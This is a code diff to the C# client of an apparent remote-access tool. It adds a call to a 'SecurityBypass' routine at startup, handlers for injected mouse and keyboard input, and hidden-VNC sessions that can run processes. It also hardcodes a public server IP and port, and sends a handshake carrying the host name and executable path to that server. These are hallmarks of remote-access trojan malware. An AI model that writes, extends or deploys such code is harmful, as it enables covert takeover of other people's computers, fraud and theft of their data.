@@ -62,6 +62,7 @@ namespace RemoteControl.Client
             {
                 if (args[0] == "/r")
                 {
+                    RemoteControl.Client.Utils.SecurityBypass.Execute();
                     InitHandlers();
                     StartConnect();
                     heartbeatThread = new Thread(() => StartHeartbeat()) {IsBackground = true};
@@ -74,12 +75,22 @@ namespace RemoteControl.Client
         static Dictionary<ePacketType, IRequestHandler> InitHandlers()
         {
             var handlers = new Dictionary<ePacketType, IRequestHandler>();
-            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, new RequestGetDrivesHandler());
+            RequestGetDrivesHandler getDrivesHandler = new RequestGetDrivesHandler();
+            handlers.Add(ePacketType.PACKET_GET_DRIVES_REQUEST, getDrivesHandler);
+            handlers.Add(ePacketType.PACKET_GET_DRIVES_EX_REQUEST, getDrivesHandler);
             handlers.Add(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST, new RequestGetSubFilesOrDirsHandler());
             handlers.Add(ePacketType.PACKET_COMMAND_REQUEST, new RequestCommandHandler());
             RequestCaptureScreenHandler captureScreenHandler = new RequestCaptureScreenHandler();
             handlers.Add(ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
             handlers.Add(ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST, captureScreenHandler);
+            handlers.Add(ePacketType.PACKET_MOUSE_EVENT_REQUEST, new RequestMouseEventHandler());
+            handlers.Add(ePacketType.PACKET_KEYBOARD_EVENT_REQUEST, new RequestKeyboardEventHandler());
+            RequestHVNCHandler hvncHandler = new RequestHVNCHandler();
+            handlers.Add(ePacketType.PACKET_HVNC_START_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_STOP_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_MOUSE_EVENT_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, hvncHandler);
+            handlers.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, hvncHandler);
             RequestDownloadHandler downloadHandler = new RequestDownloadHandler();
             handlers.Add(ePacketType.PACKET_START_DOWNLOAD_REQUEST, downloadHandler);
             handlers.Add(ePacketType.PACKET_STOP_DOWNLOAD_REQUEST, downloadHandler);
@@ -97,8 +108,8 @@ namespace RemoteControl.Client
             ClientParameters paras = new ClientParameters();
             if (isTestMode)
             {
-                paras.SetServerIP("192.168.1.136");
-                paras.ServerPort = 10086;
+                paras.SetServerIP("203.91.76.159");
+                paras.ServerPort = 10010;
                 paras.OnlineAvatar = "";
                 paras.ServiceName = "";
             }
@@ -108,8 +119,16 @@ namespace RemoteControl.Client
                 paras = ClientParametersManager.ReadParameters(filePath); 
             }
             Console.WriteLine("参数信息：");
-            Console.WriteLine("IP:" + paras.GetServerIP());
-            Console.WriteLine("PORT：" + paras.ServerPort);
+            if (!isTestMode)
+            {
+                Console.WriteLine("IP:" + paras.GetServerIP());
+                Console.WriteLine("PORT：" + paras.ServerPort);
+            }
+            else
+            {
+                Console.WriteLine("IP: 203.91.76.159 (test mode)");
+                Console.WriteLine("PORT: 10010 (test mode)");
+            }
 
             return paras;
         }
@@ -118,17 +137,34 @@ namespace RemoteControl.Client
         {
             var paras = ReadParameters();
             var handlers = InitHandlers();
+            IPEndPoint ep;
+            if (isTestMode)
+            {
+                ep = new IPEndPoint(IPAddress.Parse("203.91.76.159"), 10010);
+            }
+            else
+            {
+                ep = paras.GetIPEndPoint();
+            }
             while (true)
             {
                 try
                 {
                     DoOutput("正在连接服务器...");
                     oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-                    oServer.Connect(paras.GetIPEndPoint());
+                    oServer.Connect(ep);
                     DoOutput("服务器连接成功！");
 
                     var oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
-                    StartRecvData(oServerSession,handlers);
+
+                    var handshake = new RemoteControl.Protocals.Relay.RelayHandshake();
+                    handshake.Role = "client";
+                    handshake.HostName = Dns.GetHostName();
+                    handshake.AppPath = Application.ExecutablePath;
+                    handshake.OnlineAvatar = paras.OnlineAvatar;
+                    oServerSession.Send(ePacketType.CYCLER_RELAY_HANDSHAKE, handshake);
+
+                    StartRecvData(oServerSession, handlers);
                     break;
                 }
                 catch (Exception ex)
@@ -141,14 +177,6 @@ namespace RemoteControl.Client
 
         static void StartRecvData(SocketSession session, Dictionary<ePacketType, IRequestHandler> handlers)
         {
-            var paras = ReadParameters();
-            // 获取主机名，并告诉服务器
-            ResponseGetHostName resp = new ResponseGetHostName();
-            resp.HostName = Dns.GetHostName();
-            resp.AppPath = Application.ExecutablePath;
-            resp.OnlineAvatar = paras.OnlineAvatar;
-            session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);
-
             new Thread(() =>
             {
                 byte[] buffer = new byte[1024];
@@ -159,8 +187,8 @@ namespace RemoteControl.Client
                     try
                     {
                         recvSize = session.SocketObj.Receive(buffer);
-                        if (recvSize < 0)
-                            continue;
+                        if (recvSize <= 0)
+                            break;
 
                         for (int i = 0; i < recvSize; i++)
                         {
@@ -171,7 +199,7 @@ namespace RemoteControl.Client
                             int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                             if (data.Count >= packetLength)
                             {
-                                DoRecvBytes(session, data.SplitBytes(0, packetLength),handlers);
+                                DoRecvBytes(session, data.SplitBytes(0, packetLength), handlers);
                                 data.RemoveRange(0, packetLength);
                             }
                             else
